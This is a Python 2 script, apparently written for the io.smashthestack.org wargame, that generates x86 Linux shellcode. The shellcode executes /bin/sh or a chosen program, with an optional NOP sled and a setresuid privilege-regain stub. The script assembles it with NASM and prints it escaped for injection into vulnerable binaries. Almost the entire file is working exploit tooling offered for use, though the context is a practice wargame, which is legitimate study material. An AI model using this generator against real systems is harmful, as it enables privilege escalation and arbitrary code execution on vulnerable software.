#!/usr/bin/python
# io.smashthestack.org (level ~10) exploit tool
# alterakey <altakey@gmail.com>

import sys
import math
import re
import shutil
import tempfile
import subprocess
import getopt

# basically execve(arg0, [arg0, args], 0)
ASM_SOURCE_CODE = """\
;;; shellcode for io.smashthestack.org trials
;;; generated with generate-shellcode.py, written by alterakey <altakey@gmail.com>
;;; loosely based on: http://www.shell-storm.org/shellcode/files/shellcode-752.php
bits 32
%(nop_push)s\
%(priv_regain_push)s\
  xor ecx,ecx
	mul ecx
%(fn_push)s\
%(args_push)s\
	or al, 11
	int 0x80
"""

def pack_as_immediate_32(token):
    """Packs given 32-bit token as a double-word immediate value."""
    a,b,c,d = (ord(t) for t in token)
    return "0x%08x" % (d<<24|c<<16|b<<8|a)

def extend_to_32bit_boundary(string):
    """Extend and align given string to the 32-bit boundary."""
    path_separator = '/'
    to_length = int(math.ceil(len(string) / 4.0) * 4)
    return re.sub(path_separator, path_separator * (to_length - len(string) + 1), string, count=1)

def tokenize(string):
    """Encodes the given string as a bunch of 32-bit immediate values."""
    for offset in range(len(string)-4, -1, -4):
        yield pack_as_immediate_32(string[offset:offset+4])

def generate_string_pusher(string):
    """Pushes general string as a bunch of 32-bit immediate push instructions."""
    if string is None:
        return ""
    else:
        return '\n'.join((('\tpush %s' % token) for token in tokenize(extend_to_32bit_boundary(string))))

def generate_fn_setter(string):
    """Sets execve(2) 1st arg, namely filename."""
    if string is None:
        return ""
    else:
        return '''\
\tpush ecx
%s
\tmov ebx, esp
''' % generate_string_pusher(string)

def generate_argument_list_setter(string_list):
    """Sets execve(2) 2nd arg, namely arguments to the first element of the given list."""
    if string_list is None:
        return '''\
\tpush ecx
\tpush ebx
\tmov ecx, esp
'''
    else:
        if len(string_list) > 1:
            raise ArgumentError("multiple arguments are not supported yet")
        return '''\
\tpush ecx
%s
\tmov edi, esp
\tpush ecx
\tpush edi
\tpush ebx
\tmov ecx, esp
''' % generate_string_pusher(string_list[0])

def generate_nop_sled(size):
    """Generates NOP sled of the given size."""
    return '%s\n' % '\n'.join(('\tnop' for i in xrange(size)))

def generate_priv_regainer():
    """Generate privilege regainer, basically does a setresuid(geteuid(), geteuid(), geteuid())."""
    return '''\
	xor eax, eax
	or al, 49
	int 0x80
	mov ebx, eax
	mov ecx, eax
	mov edx, eax
	xor eax, eax
	or al, 208
	int 0x80
'''

def shell_encode(binary):
    """Escapes the given binary."""
    return "$'%s'" % ''.join((r'\x%02x' % ord(ch) for ch in binary))

def assemble(source_block):
    """Assembles the given string with the NASM."""
    try:
        wd = tempfile.mkdtemp()
        srcname = "%s/src.S" % wd
        destname = "%s/src.o" % wd
        with open(srcname, "w") as src:
            src.write(source_block)
            src.flush()

        subprocess.check_call(["nasm", srcname, "-o", destname])

        with open(destname, "rb") as dest:
            return dest.read()
    finally:
        shutil.rmtree(wd)

def build_source(**params):
    """Builds the assembler source code with the given parameters."""
    return ASM_SOURCE_CODE % params

if __name__ == '__main__':
    mode = dict(
        asm=False,
        shell=True,
        regain_priv=False,
        nops=0,
        arg0='/bin/sh',
        args=None
    )

    try:
        opts, args = getopt.getopt(sys.argv[1:], 'abxr', ['asm', 'binary', 'shell-hex', 'regain-priv', 'nops='])
        for opt, value in opts:
            if opt in ('-a', '--asm'):        mode['asm'] = True
            if opt in ('-x', '--shell-hex'):  mode['shell'] = True
            if opt in ('-b', '--binary'):     mode['shell'] = False
            if opt in ('-r', '--regain-priv'): mode['regain_priv'] = True
            if opt in ('--nops'):             mode['nops'] = max(int(value), 0)
        try:
            mode['arg0'] = args[0]
            mode['args'] = [args[1]]
        except IndexError:
            pass
    except IndexError:
        pass
    except (ValueError, getopt.GetoptError):
        print "usage: %s [-b|--binary] [-x|--shell-hex] [--nops <nopsled size>] [program name] [first argument]" % sys.argv[0]
        sys.exit(1)

    source = build_source(
        nop_push=generate_nop_sled(mode['nops']),
        priv_regain_push=mode['regain_priv'] and generate_priv_regainer() or '',
        fn_push=generate_fn_setter(mode['arg0']),
        args_push=generate_argument_list_setter(mode['args'])
    )

    if mode['asm']:
        print source
    else:
        if mode['shell']:
            print shell_encode(assemble(source))
        else:
            sys.stdout.write(assemble(source))
